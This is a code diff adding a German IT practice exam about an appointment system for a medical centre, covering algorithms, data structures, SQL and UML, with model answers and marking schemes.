+          {id: 'r', k: 'box', x: 80, y: 100, w: 120, h: 50, t: ['Router', '99,9 %']}, {id: 'f', k: 'box', x: 250, y: 100, w: 120, h: 50, t: ['Firewall', '99,95 %']},
+          {id: 'w1', k: 'box', x: 450, y: 50, w: 130, h: 50, t: ['Webserver 1', '99 %'], s: 'accent'}, {id: 'w2', k: 'box', x: 450, y: 150, w: 130, h: 50, t: ['Webserver 2', '99 %'], s: 'accent'},
+          {id: 'd', k: 'cyl', x: 680, y: 100, w: 130, h: 64, t: ['Datenbank', '99,8 %']},
+        ], edges: [{a: 'r', b: 'f', ea: 'none'}, {a: 'f', b: 'w1', ea: 'none'}, {a: 'f', b: 'w2', ea: 'none'}, {a: 'w1', b: 'd', ea: 'none'}, {a: 'w2', b: 'd', ea: 'none'}]}], ['tool', 'avail']],
+        see: ['infra-verfuegbarkeit']},
+      {pts: 2, topic: 'Ausfallzeit', q: 'Wie viele **Stunden pro Jahr** darf der Buchungsdienst bei dieser Verfügbarkeit ausfallen (365 Tage, eine Nachkommastelle, mit dem ungerundeten Ergebnis rechnen)?',
+        num: {c: 31.5, tol: 0.06, unit: 'Stunden'},
+        a: ['Ausfallzeit = (1 - 0,99640) x 365 x 24 h = 0,0035962 x 8.760 h ≈ **31,5 Stunden** pro Jahr (rund 2,6 Stunden im Monat).'],
+        see: ['infra-verfuegbarkeit']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/eua4-1.js
+// Probeprüfung 4, Entwicklung und Umsetzung von Algorithmen: VitaMed Nord MVZ, TerminPlus.
+(function () {
+  const ID = 'exam4-eua';
+  const clock = (t) => { const m = 480 + t * 15; return Math.floor(m / 60) + ':' + String(m % 60).padStart(2, '0'); };
+  // Zeitstrahl 8:00 bis 12:00 in 15-Minuten-Einheiten; [Name, Start, Dauer, Stil]
+  const day = (rows, cap) => ['diagram', AP2.dg.gantt(rows, {total: 16, unit: 40, tick: 2, left: 170, tickLabel: clock, cap})];
+  const T = [['T1 08:00 bis 08:30', 0, 2], ['T2 08:45 bis 10:00', 3, 5], ['T3 09:50 bis 10:30', 7.333, 2.667], ['T4 11:00 bis 11:40', 12, 2.667]];
+  const q = (items, cap) => ['diagram', AP2.dg.flow(items.length ? items : ['(leer)'], {w: 720, h: 96, bw: 110, styles: items.map((t) => (/Notfall/.test(t) ? 'bad' : 'accent')), cap})];
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 4 (Gesundheit)', t: 'Entwicklung und Umsetzung von Algorithmen: TerminPlus', blocks: []});
+  AP2.exam.start(ID, {minutes: 90, cover: AP2.exam.COVER.eua,
+    hint: 'Schwerpunkte: Intervall-Algorithmen mit Schreibtischtest, Warteschlangen und verkettete Listen, Hashtabellen, SQL mit bedingter Aggregation, Transaktionen und Rechten, Interfaces, Validierung, Wert- und Referenzübergabe.',
+    intro: [['p', 'Sie entwickeln bei der **Elbcode IT-Solutions GmbH** die Terminplattform **TerminPlus** für das **VitaMed Nord MVZ**. Zeiten werden intern als **Minuten seit Mitternacht** gespeichert (8:00 Uhr = 480, 12:00 Uhr = 720). Ein Termin ist ein Paar **[beginn, ende]**; das Ende gehört nicht mehr zum Termin.']]});
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 1: Freie Zeitfenster berechnen (25 Punkte)',
+    tasks: [
+      {pts: 3, topic: 'Intervalle', q: 'Geben Sie eine Bedingung an, mit der Sie prüfen, ob sich zwei Termine a = [a.beginn, a.ende] und b = [b.beginn, b.ende] **überschneiden**. Termine, die direkt aneinander anschließen (a.ende = b.beginn), überschneiden sich nicht.',
+        a: [['code', 'pseudo', 'ueberschneidung = (a.beginn < b.ende) UND (b.beginn < a.ende)'], 'Begründung: Zwei Intervalle überschneiden sich genau dann **nicht**, wenn eines endet, bevor (oder genau wenn) das andere beginnt: a.ende <= b.beginn ODER b.ende <= a.beginn. Die Verneinung ergibt die Bedingung oben (De Morgan). Mit < statt <= zählen anschließende Termine nicht als Überschneidung.'],
+        sol: [['diagram', AP2.dg.gantt([['a', 0, 4, 'accent'], ['b überschneidet', 3, 3, 'bad'], ['b schließt an', 4, 3, 'ok']], {total: 8, unit: 60, left: 160, cap: 'Rot überschneidet a, grün schließt direkt an (keine Überschneidung)'})]],
+        see: ['eua-kontroll']},
+      {pts: 10, rows: 14, topic: 'Algorithmus entwickeln', q: 'Entwickeln Sie die Funktion **freieFenster(termine, tagBeginn, tagEnde, dauer)**. termine ist eine nach beginn **aufsteigend sortierte** Liste von Terminen eines Arztes; Termine können sich (fehlerhaft) überschneiden. Die Funktion liefert eine Liste aller Lücken **[von, bis]** innerhalb der Sprechzeit, die **mindestens dauer** Minuten lang sind.',
+        a: ['Idee: Ein Zeiger **frei_ab** merkt sich, ab wann der Arzt frei ist. Für jeden Termin: Ist die Lücke bis zu seinem Beginn lang genug, wird sie gespeichert. Danach rückt frei_ab auf das **Maximum** von frei_ab und Terminende (wichtig bei Überschneidungen). Am Schluss die Lücke bis zum Tagesende prüfen.',
+          ['codes', [['pseudo', `funktion freieFenster(termine, tagBeginn, tagEnde, dauer)
+    ergebnis = leere Liste
+    frei_ab = tagBeginn
+    für jeden t in termine
+        wenn t.beginn - frei_ab >= dauer dann
+            ergebnis.hinzufügen([frei_ab, t.beginn])
+        ende wenn
+        frei_ab = max(frei_ab, t.ende)
+    ende für
+    wenn tagEnde - frei_ab >= dauer dann
+        ergebnis.hinzufügen([frei_ab, tagEnde])
+    ende wenn
+    rückgabe ergebnis
+ende funktion`], ['java', `static List<int[]> freieFenster(List<int[]> termine, int tagBeginn, int tagEnde, int dauer) {
+    List<int[]> ergebnis = new ArrayList<>();
+    int freiAb = tagBeginn;
+    for (int[] t : termine) {                 // t[0] = beginn, t[1] = ende
+        if (t[0] - freiAb >= dauer) ergebnis.add(new int[]{freiAb, t[0]});
+        freiAb = Math.max(freiAb, t[1]);
+    }
+    if (tagEnde - freiAb >= dauer) ergebnis.add(new int[]{freiAb, tagEnde});
+    return ergebnis;
+}`], ['python', `def freie_fenster(termine, tag_beginn, tag_ende, dauer):
+    ergebnis = []
+    frei_ab = tag_beginn
+    for beginn, ende in termine:
+        if beginn - frei_ab >= dauer:
+            ergebnis.append([frei_ab, beginn])
+        frei_ab = max(frei_ab, ende)
+    if tag_ende - frei_ab >= dauer:
+        ergebnis.append([frei_ab, tag_ende])
+    return ergebnis`]]],
+          'Bewertung: Initialisierung (1 P), Schleife (2 P), Lückenprüfung und Hinzufügen (2 P), Fortschreiben mit Maximum (3 P; ohne Maximum 1 P), Prüfung am Tagesende (1 P), Rückgabe (1 P).'],
+        see: ['eua-algoexam', 'eua-pseudocode']},
+      {pts: 7, rows: 9, topic: 'Schreibtischtest', q: 'Führen Sie einen Schreibtischtest Ihrer Funktion (oder der Musterlösung) durch: tagBeginn = 480, tagEnde = 720, dauer = 30, termine = [[480, 510], [525, 600], [590, 630], [660, 700]]. Notieren Sie je Schleifendurchlauf t, die Lücke, ob sie gespeichert wird, und frei_ab. Geben Sie das Ergebnis in Uhrzeiten an.',
+        a: [['table', ['Schritt', 't', 'Lücke t.beginn - frei_ab', 'gespeichert?', 'frei_ab danach'], [['Start', '-', '-', '-', '480'], ['1', '[480, 510]', '0', 'nein', '510'], ['2', '[525, 600]', '15', 'nein', '600'], ['3', '[590, 630]', '-10 (Überschneidung)', 'nein', '**630** (max)'], ['4', '[660, 700]', '30', '**ja: [630, 660]**', '700'], ['Ende', '-', '720 - 700 = 20', 'nein', '-']]],
+          'Ergebnis: **[[630, 660]]**, also ein freies Fenster von **10:30 bis 11:00 Uhr**.', 'Bewertung: je Zeile 1 P, Ergebnis 2 P.'],
+        sol: [['walk', {t: 'Der Zeiger frei_ab wandert über den Vormittag', steps: [
+          {t: '**Ausgangslage:** Vier Termine, T2 und T3 überschneiden sich (9:50 bis 10:00). frei_ab startet bei 8:00.', b: [day(T, 'Termine des Vormittags')]},
+          {t: '**T1 und T2:** Die Lücken vor T1 (0 min) und vor T2 (8:30 bis 8:45, 15 min) sind kürzer als 30 Minuten. frei_ab steht danach auf 10:00.', b: [day(T.concat([['zu kurz: 15 min', 2, 1, 'gold']]), 'Die 15-Minuten-Lücke reicht nicht')]},
+          {t: '**T3:** beginnt vor frei_ab (Lücke -10). Ohne max würde frei_ab auf 10:30 springen, mit max ebenfalls: max(600, 630) = 630. Wichtig wäre max, wenn ein späterer Termin **früher** endet als der vorherige.', b: [day(T, 'Überschneidung: frei_ab = 10:30')]},
+          {t: '**T4:** Lücke 10:30 bis 11:00 = 30 Minuten: gespeichert. Danach frei_ab = 11:40; bis 12:00 bleiben nur 20 Minuten.', b: [day(T.concat([['FREI 10:30 bis 11:00', 10, 2, 'ok']]), 'Ergebnis: genau ein freies Fenster')]},
+        ]}]],
+        see: ['eua-algoexam']},
+      {pts: 5, topic: 'Sortieren', q: 'Das PVS liefert die Termine **unsortiert**. a) Was müssen Sie vor dem Aufruf von freieFenster tun und mit welcher Laufzeit? b) Welches Sortierverfahren empfehlen Sie für 10.000 Termine und warum? c) Zeigen Sie, wie Sie in einer Sprache Ihrer Wahl mit der Standardbibliothek nach beginn sortieren.',
+        a: ['a) Die Liste nach **beginn aufsteigend sortieren**. Laufzeit mit einem effizienten Verfahren **O(n log n)**; freieFenster selbst ist O(n).', 'b) **Mergesort** (oder Timsort, die Standardsortierung von Java für Objekte und Python): garantiert **O(n log n)** auch im schlechtesten Fall und **stabil** (Termine mit gleichem Beginn behalten ihre Reihenfolge). Quicksort ist im Mittel schnell, im schlechtesten Fall O(n²). Bubble- oder Insertion Sort mit O(n²) wären bei 10.000 Terminen rund 50 Millionen Vergleiche.',
+          ['codes', [['java', 'termine.sort(Comparator.comparingInt(t -> t[0]));   // stabil (TimSort)'], ['python', 'termine.sort(key=lambda t: t[0])   # stabil (Timsort)'], ['csharp', 'termine = termine.OrderBy(t => t[0]).ToList();   // stabil']]]],
+        see: ['eua-sortieren', 'eua-onotation']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 2: Datenstrukturen für das Wartezimmer (25 Punkte)',
+    tasks: [
+      {pts: 6, rows: 7, topic: 'Queue und Prioritätswarteschlange', q: 'Folgende Ereignisse treten nacheinander auf: Ankunft **Ahrens**, Ankunft **Bauer**, Ankunft **Celik (Notfall)**, **Aufruf**, Ankunft **Dorn**, Ankunft **Engel (Notfall)**, **Aufruf**, **Aufruf**, **Aufruf**. Geben Sie die Reihenfolge der aufgerufenen Personen an a) bei einer einfachen Warteschlange (FIFO), b) bei einer Prioritätswarteschlange (Notfälle zuerst, sonst nach Ankunft). Wer wartet am Ende jeweils noch?',
+        a: ['a) **FIFO:** Ahrens, Bauer, Celik, Dorn. Es wartet noch **Engel** (ein Notfall wartet: das zeigt, warum FIFO hier ungeeignet ist).', 'b) **Prioritätswarteschlange:** Celik, Engel, Ahrens, Bauer. Es wartet noch **Dorn**.', 'Bewertung: a) 2 P, b) 3 P, Rest 1 P.'],
+        sol: [['walk', {t: 'Prioritätswarteschlange Schritt für Schritt', steps: [
+          {t: 'Ahrens, Bauer und Celik (Notfall) kommen an. Der Notfall wird **vor** die normalen Patienten einsortiert.', b: [q(['Celik Notfall', 'Ahrens', 'Bauer'], 'vorne wird aufgerufen')]},
+          {t: '**Aufruf 1: Celik.** Dann kommen Dorn und Engel (Notfall). Engel kommt vor alle normalen.', b: [q(['Engel Notfall', 'Ahrens', 'Bauer', 'Dorn'], 'nach den Ankünften')]},
+          {t: '**Aufruf 2 bis 4:** Engel, Ahrens, Bauer. Dorn wartet noch.', b: [q(['Dorn'], 'am Ende')]},
+          {t: '**Zum Vergleich FIFO:** Die Reihenfolge entspricht nur der Ankunft. Nach vier Aufrufen wartet ausgerechnet der Notfall Engel.', b: [q(['Engel Notfall'], 'FIFO am Ende')]},
+        ]}]],
+        see: ['eua-stackqueue']},
+      {pts: 9, rows: 14, topic: 'Verkettete Liste', q: 'Implementieren Sie eine Warteschlange für Patientennamen als **einfach verkettete Liste** mit einem Verweis auf den Anfang (kopf) und das Ende (ende). Benötigt werden die Klasse **Knoten** und die Klasse **Warteschlange** mit **einreihen(name)** (hinten anfügen, O(1)), **aufrufen()** (vorderen Namen entfernen und zurückgeben; bei leerer Schlange null) und **istLeer()**. Sie dürfen keine fertigen Listenklassen verwenden.',
+        a: [['codes', [['java', `class Knoten {
+    String name;
+    Knoten naechster;
+    Knoten(String name) { this.name = name; }
+}
+
+class Warteschlange {
+    private Knoten kopf, ende;
+
+    public boolean istLeer() { return kopf == null; }
+
+    public void einreihen(String name) {
+        Knoten neu = new Knoten(name);
+        if (istLeer()) {
+            kopf = neu;               // erster Knoten ist Anfang und Ende
+        } else {
+            ende.naechster = neu;     // hinten anhängen
+        }
+        ende = neu;
+    }
+
+    public String aufrufen() {
+        if (istLeer()) return null;
+        String name = kopf.name;
+        kopf = kopf.naechster;        // vorderen Knoten aushängen
+        if (kopf == null) ende = null; // Schlange ist jetzt leer
+        return name;
+    }
+}`], ['python', `class Knoten:
+    def __init__(self, name):
+        self.name = name
+        self.naechster = None
+
+class Warteschlange:
+    def __init__(self):
+        self.kopf = None
+        self.ende = None
+
+    def ist_leer(self):
+        return self.kopf is None
+
+    def einreihen(self, name):
+        neu = Knoten(name)
+        if self.ist_leer():
+            self.kopf = neu
+        else:
+            self.ende.naechster = neu
+        self.ende = neu
+
+    def aufrufen(self):
+        if self.ist_leer():
+            return None
+        name = self.kopf.name
+        self.kopf = self.kopf.naechster
+        if self.kopf is None:
+            self.ende = None
+        return name`]]],
+          'Bewertung: Knotenklasse (1 P), istLeer (1 P), einreihen mit Sonderfall leere Schlange (3 P), aufrufen mit Sonderfällen leer und letzter Knoten (3 P), O(1) durch ende-Verweis (1 P).'],
+        sol: [['diagram', {w: 800, h: 190, keep: 660, cap: 'Nach einreihen("Ahrens"), einreihen("Bauer"), einreihen("Dorn"): aufrufen() hängt vorn aus, einreihen hängt hinten an', nodes: [
+          {id: 'k', k: 'text', x: 110, y: 30, t: 'kopf', w: 10, h: 10, b: true}, {id: 'e', k: 'text', x: 570, y: 30, t: 'ende', w: 10, h: 10, b: true},
+          {id: 'n1', k: 'box', x: 110, y: 110, w: 150, h: 50, t: ['Ahrens', 'naechster ●'], s: 'accent'}, {id: 'n2', k: 'box', x: 340, y: 110, w: 150, h: 50, t: ['Bauer', 'naechster ●'], s: 'accent'},
+          {id: 'n3', k: 'box', x: 570, y: 110, w: 150, h: 50, t: ['Dorn', 'naechster: null'], s: 'accent'}, {id: 'nil', k: 'text', x: 730, y: 110, t: '∅', w: 10, h: 10},
+        ], edges: [{a: 'k', b: 'n1'}, {a: 'e', b: 'n3'}, {a: 'n1', b: 'n2'}, {a: 'n2', b: 'n3'}]}],
+          ['warn', 'Wer beim Entfernen des letzten Knotens **ende** nicht auf null setzt, hängt beim nächsten einreihen an einen Knoten an, der gar nicht mehr in der Schlange ist.']],
+        see: ['eua-listen', 'eua-stackqueue']},
+      {pts: 5, rows: 7, topic: 'Hashtabelle', q: 'Patienten werden in einer Hashtabelle der Größe 7 gespeichert, Hashfunktion **h(k) = k mod 7**, Kollisionen werden durch **lineares Sondieren** (nächster freier Platz) gelöst. Fügen Sie die Schlüssel **15, 22, 8, 29, 3** in dieser Reihenfolge ein und geben Sie die Belegung an. Berechnen Sie den Belegungsfaktor und nennen Sie ein Problem des linearen Sondierens.',
+        a: [['table', ['Index', '0', '1', '2', '3', '4', '5', '6'], [['Schlüssel', '-', '15', '22', '8', '29', '3', '-']]],
+          '- 15 mod 7 = 1: Platz 1. 22 mod 7 = 1 belegt: Platz 2. 8 mod 7 = 1: 1, 2 belegt: Platz 3. 29 mod 7 = 1: Platz 4. 3 mod 7 = 3 belegt, 4 belegt: Platz 5.', 'Belegungsfaktor = 5 / 7 ≈ **0,71**.', 'Problem: **Clusterbildung (primäres Clustering)**: Kollisionen erzeugen lange belegte Folgen, Suchen und Einfügen werden immer langsamer (hier braucht die 3 drei Versuche). Abhilfe: Tabelle vergrößern (Rehashing ab etwa 0,7), quadratisches Sondieren, Verkettung (Chaining).'],
+        sol: [['walk', {t: 'Einfügen mit linearem Sondieren', steps: [
+          {t: '**15** → 15 mod 7 = 1, frei.', b: [['table', ['Index', '0', '1', '2', '3', '4', '5', '6'], [['', '', '**15**', '', '', '', '', '']]]]},
+          {t: '**22** → 1 belegt, Platz 2.', b: [['table', ['Index', '0', '1', '2', '3', '4', '5', '6'], [['', '', '15', '**22**', '', '', '', '']]]]},
+          {t: '**8** → 1, 2 belegt, Platz 3.', b: [['table', ['Index', '0', '1', '2', '3', '4', '5', '6'], [['', '', '15', '22', '**8**', '', '', '']]]]},
+          {t: '**29** → 1, 2, 3 belegt, Platz 4. Der Cluster wächst.', b: [['table', ['Index', '0', '1', '2', '3', '4', '5', '6'], [['', '', '15', '22', '8', '**29**', '', '']]]]},
+          {t: '**3** → 3 mod 7 = 3 belegt (von der 8!), 4 belegt, Platz 5. Auch Schlüssel mit anderem Hashwert leiden unter dem Cluster.', b: [['table', ['Index', '0', '1', '2', '3', '4', '5', '6'], [['', '', '15', '22', '8', '29', '**3**', '']]]]},
+        ]}], ['tool', 'hash']],
+        see: ['eua-hash']},
+      {pts: 5, topic: 'Suchaufwand', q: 'Für die Suche nach einer Versichertennummer unter **1.000.000** Patienten stehen zur Wahl: a) lineare Suche in einer unsortierten Liste, b) binäre Suche in einem sortierten Feld, c) Hashtabelle. Geben Sie jeweils die Komplexität und die Zahl der Vergleiche im schlechtesten Fall (bei c im Mittel) an und nennen Sie einen Nachteil von b.',
+        a: [['table', ['Verfahren', 'Komplexität', 'Vergleiche'], [['a) lineare Suche', 'O(n)', 'bis zu **1.000.000**'], ['b) binäre Suche', 'O(log n)', 'höchstens **20** (2²⁰ = 1.048.576)'], ['c) Hashtabelle', 'O(1) im Mittel', 'etwa **1** (O(n) im schlechtesten Fall bei vielen Kollisionen)']]],
+          'Nachteil von b: Das Feld muss **sortiert** bleiben; jedes Einfügen kostet O(n) (Elemente verschieben), außerdem braucht sie wahlfreien Zugriff (kein Einsatz auf verketteten Listen).'],
+        sol: [['chart', {kind: 'bar', w: 640, h: 260, labels: ['linear', 'binär', 'Hash'], series: [{n: 'log10(Vergleiche + 1)', d: [6, 1.32, 0.3], k: 'accent'}], vals: false, yl: 'Größenordnung (Zehnerpotenz)', cap: 'Logarithmische Darstellung: 1.000.000 gegen 20 gegen 1 Vergleich'}]],
+        see: ['eua-suchen', 'eua-onotation', 'eua-hash']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 3: Datenbank TerminPlus (25 Punkte)',
+    ctx: [['h3', 'Anlage: Tabellen mit Beispieldaten'],
+      ['diagram', {w: 760, h: 200, keep: 620, cap: 'Datenmodell (Ausschnitt)', nodes: [
+        {id: 'p', k: 'cls', x: 110, y: 90, w: 190, t: {name: 'patient', attrs: ['PK patient_id', 'name', 'geburtsdatum', 'kasse']}},
+        {id: 't', k: 'cls', x: 380, y: 90, w: 200, t: {name: 'termin', attrs: ['PK termin_id', 'FK patient_id', 'FK arzt_id', 'beginn (DATETIME)', 'dauer_min', 'status']}},
+        {id: 'a', k: 'cls', x: 650, y: 90, w: 170, t: {name: 'arzt', attrs: ['PK arzt_id', 'name', 'fach']}},
+      ], edges: [{a: 't', b: 'p', sa: 'many', ea: 'one'}, {a: 't', b: 'a', sa: 'many', ea: 'one'}]}],
+      ['row', [['table', ['patient_id', 'name', 'geburtsdatum', 'kasse'], [['10', 'Meyer', '1958-04-12', 'AOK'], ['11', 'Schulz', '1990-09-30', 'TK'], ['12', 'Nguyen', '1972-01-05', 'Barmer'], ['13', 'Wagner', '1949-11-23', 'DAK'], ['14', 'Becker', '2001-06-17', 'TK']]],
+        ['table', ['arzt_id', 'name', 'fach'], [['1', 'Dr. Yilmaz', 'Allgemeinmedizin'], ['2', 'Dr. Hoffmann', 'Kardiologie'], ['3', 'Dr. Petersen', 'Dermatologie']]]]],
+      ['table', ['termin_id', 'patient_id', 'arzt_id', 'beginn', 'dauer_min', 'status'], [['100', '10', '1', '2026-11-16 08:00', '15', 'erschienen'], ['101', '12', '1', '2026-11-16 08:30', '15', 'nicht_erschienen'], ['102', '11', '1', '2026-11-16 08:15', '30', 'erschienen'], ['103', '10', '2', '2026-11-16 09:00', '30', 'erschienen'], ['104', '14', '1', '2026-11-17 10:00', '15', 'abgesagt'], ['105', '12', '2', '2026-11-17 11:00', '30', 'nicht_erschienen'], ['106', '11', '3', '2026-11-18 14:00', '20', 'erschienen'], ['107', '14', '2', '2026-11-18 15:00', '30', 'nicht_erschienen'], ['108', '10', '1', '2026-11-19 08:00', '15', 'gebucht']]]],
+    tasks: [
+      {pts: 4, topic: 'JOIN über drei Tabellen', q: 'Erstellen Sie die Tagesliste von **Dr. Yilmaz** für den **16.11.2026**: Uhrzeit (beginn), Patientenname und Status, sortiert nach beginn.',
+        a: [['code', 'sql', `SELECT t.beginn, p.name, t.status
+FROM termin t
+JOIN patient p ON p.patient_id = t.patient_id
+JOIN arzt a    ON a.arzt_id    = t.arzt_id
+WHERE a.name = 'Dr. Yilmaz'
+  AND t.beginn >= '2026-11-16' AND t.beginn < '2026-11-17'
+ORDER BY t.beginn;`], ['table', ['beginn', 'name', 'status'], [['2026-11-16 08:00', 'Meyer', 'erschienen'], ['2026-11-16 08:15', 'Schulz', 'erschienen'], ['2026-11-16 08:30', 'Nguyen', 'nicht_erschienen']]],
+          'Hinweis: Der Bereich >= Tag und < Folgetag ist sicherer als DATE(beginn) = ..., weil er einen Index auf beginn nutzen kann.'],
+        see: ['eua-sqljoin']},
+      {pts: 5, topic: 'Bedingte Aggregation', q: 'Ermitteln Sie je Arzt die Zahl der **wahrgenommenen oder versäumten** Termine (Status erschienen oder nicht_erschienen), davon die Zahl der **versäumten** und die **No-Show-Quote** in Prozent (eine Nachkommastelle). Nur Ärzte mit mindestens 3 solchen Terminen, höchste Quote zuerst.',
+        a: [['code', 'sql', `SELECT a.name,
+       COUNT(*) AS termine,
+       SUM(CASE WHEN t.status = 'nicht_erschienen' THEN 1 ELSE 0 END) AS no_shows,
+       ROUND(100.0 * SUM(CASE WHEN t.status = 'nicht_erschienen' THEN 1 ELSE 0 END)
+             / COUNT(*), 1) AS quote
+FROM arzt a
+JOIN termin t ON t.arzt_id = a.arzt_id
+WHERE t.status IN ('erschienen', 'nicht_erschienen')
+GROUP BY a.arzt_id, a.name
+HAVING COUNT(*) >= 3
+ORDER BY quote DESC;`], ['table', ['name', 'termine', 'no_shows', 'quote'], [['Dr. Hoffmann', '3', '2', '66.7'], ['Dr. Yilmaz', '3', '1', '33.3']]],
+          'Dr. Petersen fällt durch HAVING heraus (nur 1 Termin). **100.0** statt 100 verhindert die Ganzzahldivision.', 'Bewertung: JOIN und WHERE (1 P), CASE in SUM (2 P), Quote (1 P), GROUP BY/HAVING/ORDER BY (1 P).'],
+        see: ['eua-sqlgroup']},
+      {pts: 4, topic: 'LEFT JOIN', q: 'Geben Sie die Namen aller Patientinnen und Patienten aus, die **vor 1961** geboren sind und **noch nie einen Termin** hatten (Zielgruppe für eine Vorsorge-Einladung).',
+        a: [['code', 'sql', `SELECT p.name
+FROM patient p
+LEFT JOIN termin t ON t.patient_id = p.patient_id
+WHERE p.geburtsdatum < '1961-01-01'
+  AND t.termin_id IS NULL;`], ['table', ['name'], [['Wagner']]], 'Meyer ist zwar vor 1961 geboren, hat aber Termine. Alternative: WHERE NOT EXISTS (SELECT 1 FROM termin t WHERE t.patient_id = p.patient_id).'],
+        see: ['eua-sqljoin']},
+      {pts: 4, topic: 'DELETE und Datenschutz', q: 'Abgesagte Termine, die älter als **zwei Jahre** sind, sollen gelöscht werden. a) Schreiben Sie die Anweisung. b) Welcher DSGVO-Grundsatz wird damit umgesetzt? c) Was passiert, wenn eine andere Tabelle (zum Beispiel rechnung) per Fremdschlüssel ohne ON DELETE-Regel auf einen dieser Termine verweist?',
+        a: [['code', 'sql', `DELETE FROM termin
+WHERE status = 'abgesagt'
+  AND beginn < CURRENT_DATE - INTERVAL '2' YEAR;   -- MySQL: DATE_SUB(CURDATE(), INTERVAL 2 YEAR)`],
+          'b) **Speicherbegrenzung** (Art. 5 Abs. 1 e DSGVO): Daten nur so lange speichern, wie es für den Zweck nötig ist. Achtung: Die **Behandlungsdokumentation** muss nach § 630f BGB **10 Jahre** aufbewahrt werden; abgesagte Termine gehören nicht dazu.', 'c) Die Löschung wird wegen der **referenziellen Integrität abgelehnt** (Standardverhalten RESTRICT / NO ACTION): Die Anweisung schlägt fehl, es wird nichts gelöscht.'],
+        see: ['eua-sqldml', 'ps-dsgvo']},
+      {pts: 4, topic: 'Transaktion', q: 'Bei einer Buchung werden ein Datensatz in termin eingefügt und der Slot in der Tabelle slot auf belegt gesetzt. Schreiben Sie beide Schritte als **Transaktion**, die abgebrochen wird, wenn der Slot schon belegt war, und erläutern Sie zwei der ACID-Eigenschaften an diesem Beispiel.',
+        a: [['code', 'sql', `START TRANSACTION;
+UPDATE slot SET belegt = 1
+ WHERE slot_id = 4711 AND belegt = 0;     -- 0 Zeilen betroffen? dann ROLLBACK
+INSERT INTO termin (patient_id, arzt_id, beginn, dauer_min, status)
+VALUES (11, 1, '2026-11-20 09:00', 15, 'gebucht');
+COMMIT;                                   -- im Fehlerfall: ROLLBACK;`],
+          '- **Atomarität:** Entweder werden Slot **und** Termin gespeichert oder keins von beiden.', '- **Konsistenz:** Nach der Transaktion gibt es keinen belegten Slot ohne Termin.', '- **Isolation:** Zwei gleichzeitige Buchungen desselben Slots stören sich nicht; die Bedingung belegt = 0 mit Zeilensperre verhindert Doppelbuchungen.', '- **Dauerhaftigkeit:** Nach COMMIT bleibt die Buchung auch bei einem Absturz erhalten.'],
+        see: ['eua-transaktionen']},
+      {pts: 4, topic: 'Rechte und Views', q: 'Die Mitarbeitenden am Empfang (Rolle **empfang**) sollen die Tagesliste lesen sowie Termine anlegen und ändern dürfen, aber **keine Termine löschen** und keine Geburtsdaten sehen. Schreiben Sie die nötigen SQL-Anweisungen (View und Rechte).',
+        a: [['code', 'sql', `CREATE ROLE empfang;
+
+CREATE VIEW v_tagesliste AS
+SELECT t.termin_id, t.beginn, p.name AS patient, a.name AS arzt, t.status
+FROM termin t
+JOIN patient p ON p.patient_id = t.patient_id
+JOIN arzt a    ON a.arzt_id    = t.arzt_id;
+
+GRANT SELECT ON v_tagesliste TO empfang;
+GRANT INSERT, UPDATE ON termin TO empfang;
+REVOKE DELETE ON termin FROM empfang;     -- nur nötig, falls zuvor erteilt`],
+          'Die View blendet sensible Spalten (Geburtsdatum, Kasse) aus; Rechte werden an **Rollen** vergeben, nicht an einzelne Personen (Least Privilege).'],
+        see: ['eua-sqlviews']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 4: Objektorientierung und Schnittstellen (25 Punkte)',
+    ctx: [['p', 'Erinnerungen werden per SMS oder E-Mail versendet. Gegeben sind die Klassen **Patient** (getName(), getMobil(), getEmail(), getKanal() liefert "SMS" oder "EMAIL") und **Termin** (getPatient(), getBeginn() als Datum mit Uhrzeit, getStatus()).']],
+    tasks: [
+      {pts: 4, rows: 7, topic: 'Interface im UML', q: 'Modellieren Sie als UML-Klassendiagramm: Eine Schnittstelle **Benachrichtigung** mit der Methode senden(p: Patient, text: String): boolean wird von **SmsBenachrichtigung** und **EmailBenachrichtigung** realisiert. Die Klasse **Erinnerungsdienst** kennt mehrere Benachrichtigungen (je Kanal eine). Erklären Sie den Unterschied zwischen einer Schnittstelle und einer abstrakten Klasse.',
+        a: ['Interface mit Stereotyp «interface», Realisierung als **gestrichelte Linie mit leerem Dreieck**, gerichtete Assoziation vom Erinnerungsdienst zur Schnittstelle (Multiplizität 1..*).', '**Schnittstelle:** nur Methodensignaturen (in Java/C# heute auch Default-Methoden), keine Attribute mit Zustand, eine Klasse kann **mehrere** Schnittstellen implementieren. **Abstrakte Klasse:** kann Attribute und fertige Methoden enthalten, nicht instanziierbar, eine Klasse erbt nur von **einer** Klasse (Java, C#).'],
+        sol: [['diagram', {w: 800, h: 320, keep: 660, cap: 'Musterlösung: Realisierung (gestrichelt mit Dreieck) und Abhängigkeit des Dienstes nur von der Schnittstelle', nodes: [
+          {id: 'd', k: 'cls', x: 140, y: 80, w: 250, t: {name: 'Erinnerungsdienst', attrs: ['- kanaele: Map<String, Benachrichtigung>'], ops: ['+ erinnere(termine, tag): int']}},
+          {id: 'i', k: 'cls', x: 560, y: 80, w: 330, s: 'accent', t: {name: ['«interface»', 'Benachrichtigung'], ops: ['+ senden(p: Patient, text: String): boolean']}},
+          {id: 's', k: 'cls', x: 430, y: 260, w: 220, t: {name: 'SmsBenachrichtigung', ops: ['+ senden(p, text): boolean']}},
+          {id: 'e', k: 'cls', x: 690, y: 260, w: 220, t: {name: 'EmailBenachrichtigung', ops: ['+ senden(p, text): boolean']}},
+        ], edges: [{a: 'd', b: 'i', ea: 'open', tb: '1..*'}, {a: 's', b: 'i', k: 'dash', ea: 'tri', via: [[430, 180], [560, 180]]}, {a: 'e', b: 'i', k: 'dash', ea: 'tri', via: [[690, 180], [560, 180]]}]}]],
+        see: ['eua-interface', 'eua-umlcode']},
+      {pts: 7, rows: 12, topic: 'Methode implementieren', q: 'Implementieren Sie **erinnere(termine, tag)** des Erinnerungsdienstes. Für jeden Termin mit Status "gebucht", dessen Beginn auf das Datum tag fällt, wird über die zum Kanal des Patienten passende Benachrichtigung der Text "Erinnerung: Ihr Termin am ‹Datum› um ‹Uhrzeit›" gesendet. Die Methode gibt die Zahl der **erfolgreich** gesendeten Erinnerungen zurück. Gibt es für einen Kanal keine Benachrichtigung, wird der Termin übersprungen.',
